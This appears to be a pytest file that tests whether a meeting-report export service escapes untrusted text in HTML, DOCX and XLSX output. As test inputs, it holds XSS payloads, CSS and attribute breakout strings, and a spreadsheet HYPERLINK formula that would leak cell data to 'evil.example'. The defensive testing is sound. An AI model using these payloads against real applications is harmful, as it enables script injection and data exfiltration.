"""Exports render untrusted text (titles, transcripts, LLM output): it must never become markup,
a formula, or a crash."""

import io
from types import SimpleNamespace

import openpyxl
import pytest
from docx import Document

from backend.services import export_service as ex

XSS = '<script>alert(1)</script><img src=x onerror=alert(2)>'


def _meeting(**over):
    base = dict(
        id=7, title="Weekly sync", filename="sync.mp4", project_name="Proj", display_id="7",
        bharatvc_meeting_id="7", meeting_id="7", meeting_date="2026-09-25", meeting_time="10:00 AM",
        agenda="Agenda", sentiment="Neutral", accuracy=91.5, duration=600, participant_count=2,
        is_approved=True, agenda_key_decisions=[],
    )
    base.update(over)
    return SimpleNamespace(**base)


def _analysis(**over):
    base = dict(summary="Summary text", mom="- point one\n- point two", action_items="- Do it [Raj]",
                decisions="", risks="- a risk")
    base.update(over)
    return SimpleNamespace(**base)


def _seg(text="hello", speaker="SPEAKER_00", start=0.0, end=2.0):
    return SimpleNamespace(text=text, speaker=speaker, start_time=start, end_time=end)


# ── HTML ──────────────────────────────────────────────────────────────────────


def test_html_report_escapes_every_untrusted_field():
    meeting = _meeting(title=XSS, project_name=XSS, agenda=XSS, filename=XSS)
    analysis = _analysis(summary=XSS, mom=f"- {XSS}", action_items=f"- {XSS} [{XSS}]", risks=f"- {XSS}")
    segments = [_seg(text=XSS, speaker=XSS)]
    settings = {"company_name": XSS, "watermark": XSS, "header_text": XSS, "footer_text": XSS,
                "logo_url": 'javascript:alert(1)"><script>alert(3)</script>'}

    out = ex.generate_html_report(meeting, analysis, settings, segments, print_mode=False)

    assert "<script>" not in out, "no attacker-controlled <script> may survive"
    assert "<img src=x" not in out
    assert "onerror=alert" not in out.replace("onerror=alert(2)&gt;", "") or "&lt;img src=x onerror" in out
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in out


def test_html_report_neutralises_css_and_attribute_injection():
    settings = {
        "theme_color_primary": "red;}</style><script>alert(9)</script><style>",
        "theme_color_secondary": '#fff" onload="alert(1)',
        "font_family": "Arial;}</style><script>alert(8)</script>",
        "watermark": '"; } </style><script>alert(7)</script><style> x{"',
        "logo_url": "https://ok.example/logo.png",
    }
    out = ex.generate_html_report(_meeting(), _analysis(), settings, [_seg()], print_mode=False)
    assert "<script>" not in out
    assert "</style><script" not in out
    assert 'onload="alert' not in out
    assert 'src="https://ok.example/logo.png"' in out, "a legitimate logo URL must still render"


def test_print_mode_emits_exactly_the_hashed_print_script():
    from backend.middleware.security_middleware import _PRINT_SCRIPT_HASH, _build_report_csp
    from backend.utils.security import REPORT_PRINT_SCRIPT

    out = ex.generate_html_report(_meeting(), _analysis(), {}, [], print_mode=True)
    assert f"<script>{REPORT_PRINT_SCRIPT}</script>" in out
    assert f"'sha256-{_PRINT_SCRIPT_HASH}'" in _build_report_csp()
    assert "'unsafe-inline'" not in _build_report_csp().split("script-src")[1].split(";")[0]


def test_html_report_survives_a_null_speaker_and_renders_two_column_grids():
    out = ex.generate_html_report(_meeting(), _analysis(), {}, [_seg(speaker=None)], print_mode=False)
    assert "Unknown" in out
    assert "grid-template-columns" in out and "grid-template-cols:" not in out


# ── DOCX / XLSX ───────────────────────────────────────────────────────────────


def test_docx_survives_control_characters_and_bad_colours():
    text = "line\x00with\x0bcontrol\x1bchars"
    settings = {"theme_color_primary": "not-a-colour", "theme_color_secondary": "#12", "font_family": '"><x>'}
    stream = ex.generate_docx_report(_meeting(title=text), _analysis(summary=text, mom=f"- {text}"), settings,
                                     [_seg(text=text), _seg(text="ok", speaker=None)])
    doc = Document(io.BytesIO(stream.getvalue()))
    body = "\n".join(p.text for p in doc.paragraphs)
    assert "linewithcontrolchars" in body
    assert "\x00" not in body


def test_xlsx_neutralises_formula_injection_and_control_characters():
    formula = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
    segments = [_seg(text=formula), _seg(text="bell\x07char", speaker=None)]
    stream = ex.generate_excel_report(_meeting(title=formula), _analysis(action_items=f"- {formula}"), segments)

    wb = openpyxl.load_workbook(io.BytesIO(stream.getvalue()))
    formulas = [c.coordinate for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.data_type == "f"]
    assert formulas == [], f"cells stored as formulas: {formulas}"

    values = [c.value for row in wb["Transcript"].iter_rows() for c in row if isinstance(c.value, str)]
    assert formula in values, "the text is preserved, just not executable"
    assert any(v == "bellchar" for v in values), "control characters are stripped, not fatal"


# ── shared helpers ────────────────────────────────────────────────────────────


@pytest.mark.parametrize("raw,expected", [("#ABC", "aabbcc"), ("1e3a8a", "1e3a8a"), ("#12345678", "123456"), ("javascript", "ffffff"), (None, "ffffff")])
def test_hex6_normalises_colours(raw, expected):
    assert ex._hex6(raw, "ffffff") == expected


def test_css_string_cannot_close_a_style_block_or_a_string():
    escaped = ex._css_string('x"</style><script>')
    assert "<" not in escaped and '"' not in escaped.replace('\\"', "")
